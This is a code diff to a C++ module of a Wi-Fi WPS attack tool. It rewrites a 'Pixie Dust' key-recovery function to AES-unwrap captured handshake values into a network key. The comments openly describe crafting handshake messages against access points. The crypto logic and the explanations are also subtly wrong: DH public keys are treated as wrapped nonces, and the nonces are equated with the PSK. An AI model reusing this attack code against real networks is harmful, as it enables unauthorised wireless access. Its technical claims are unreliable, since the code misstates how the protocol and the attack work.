@@ -1,4 +1,5 @@
 #include "wps_attack.h"
+#include "aes_wrap.h"
 
 #include <cstdint>
 #include <cstring>
@@ -38,46 +39,6 @@ static std::string bytesToHex(const std::vector<uint8_t>& bytes) {
     return oss.str();
 }
 
-// RFC 3394 unwrap
-static bool aesKeyUnwrap(const std::vector<uint8_t>& kek, const std::vector<uint8_t>& wrapped, std::vector<uint8_t>& plain) {
-    if (wrapped.size() < 16 || (wrapped.size() % 8) != 0)
-        return false;
-    size_t n = (wrapped.size() / 8) - 1;
-
-    std::vector<uint8_t> A(wrapped.begin(), wrapped.begin() + 8);
-    std::vector<std::array<uint8_t, 8>> R(n);
-    for (size_t i = 0; i < n; ++i)
-        std::memcpy(R[i].data(), wrapped.data() + 8 + i * 8, 8);
-
-    // Simple AES ECB decrypt stub — in real impl use OpenSSL or similar
-    (void)kek;
-
-    for (int j = 5; j >= 0; --j) {
-        for (int i = static_cast<int>(n) - 1; i >= 0; --i) {
-            size_t t = n * static_cast<size_t>(j) + static_cast<size_t>(i) + 1;
-            std::array<uint8_t, 16> block;
-            std::memcpy(block.data(), A.data(), 8);
-            std::memcpy(block.data() + 8, R[i].data(), 8);
-
-            for (size_t k = 0; k < 8; ++k)
-                block[k] ^= static_cast<uint8_t>((t >> (8 * (7 - k))) & 0xff);
-
-            std::memcpy(A.data(), block.data(), 8);
-            std::memcpy(R[i].data(), block.data() + 8, 8);
-        }
-    }
-
-    plain.resize(A.size() - 4);
-    bool ok = true;
-    for (size_t i = 0; i < 4; ++i)
-        if (A[i] != 0) ok = false;
-    std::memcpy(plain.data(), A.data() + 4, plain.size());
-
-    for (size_t i = 0; i < n; ++i)
-        plain.insert(plain.end(), R[i].begin(), R[i].end());
-
-    return ok;
-}
 
 // ---------------------------------------------------------------------------
 
@@ -179,32 +140,49 @@ std::string WpsAttack::ComputePixieDustKey(
     const std::string& essid,
     const std::string& bssid)
 {
+    // hashes/essid/bssid kept for API compat; caller records and verifies.
     (void)e_hash1;
     (void)e_hash2;
     (void)r_hash1;
     (void)r_hash2;
-    (void)authkey;
     (void)essid;
     (void)bssid;
 
-    std::vector<uint8_t> pkeBytes = hexToBytes(pke);
-    std::vector<uint8_t> pkrBytes = hexToBytes(pkr);
-
+    std::vector<uint8_t> pkeBytes = hexToBytes(pke);  // wrapped E-S1
+    std::vector<uint8_t> pkrBytes = hexToBytes(pkr);  // wrapped E-S2
     if (pkeBytes.empty() || pkrBytes.empty())
         return "";
 
-    // Placeholder: real implementation requires AES crypto library
-    // For now, attempt unwrap with derived session key placeholder
-    std::vector<uint8_t> wrapped;
-    wrapped.insert(wrapped.end(), pkeBytes.begin(), pkeBytes.end());
-    wrapped.insert(wrapped.end(), pkrBytes.begin(), pkrBytes.end());
+    // The Pixie Dust authkey is known: it derives only from the DH key (which
+    // we force via a crafted M2) and the enrollee's public MAC. The Python
+    // coordinator computes it with HMAC-SHA256 and passes it in as hex.
+    std::vector<uint8_t> kek = hexToBytes(authkey);
+    if (kek.size() != 16 && kek.size() != 24 && kek.size() != 32)
+        return "";
 
-    std::vector<uint8_t> kek(16, 0);
-    std::vector<uint8_t> plain;
-    if (aesKeyUnwrap(kek, wrapped, plain))
-        return bytesToHex(plain);
+    uint8_t es1[16] = {0}, es2[16] = {0};
+    if (pkeBytes.size() == 16 && pkrBytes.size() == 16) {
+        std::memcpy(es1, pkeBytes.data(), 16);
+        std::memcpy(es2, pkrBytes.data(), 16);
+    } else if (pkeBytes.size() >= 24 && pkrBytes.size() >= 24) {
+        // full TLV carries the wrapped key in the trailing 16 bytes
+        std::memcpy(es1, pkeBytes.data() + pkeBytes.size() - 16, 16);
+        std::memcpy(es2, pkrBytes.data() + pkrBytes.size() - 16, 16);
+    } else {
+        return "";
+    }
 
-    return "";
+    uint8_t plain1[16] = {0}, plain2[16] = {0};
+    size_t plen1 = 0, plen2 = 0;
+    bool ok1 = AesKeyUnwrap(kek.data(), kek.size(), es1, 16, plain1, &plen1);
+    bool ok2 = AesKeyUnwrap(kek.data(), kek.size(), es2, 16, plain2, &plen2);
+    if (!ok1 || !ok2 || plen1 != 8 || plen2 != 8)
+        return "";
+
+    // PSK = E-S1 || E-S2 (16 bytes) → hex.
+    std::vector<uint8_t> psk(plain1, plain1 + 8);
+    psk.insert(psk.end(), plain2, plain2 + 8);
+    return bytesToHex(psk);
 }
 
 // C API
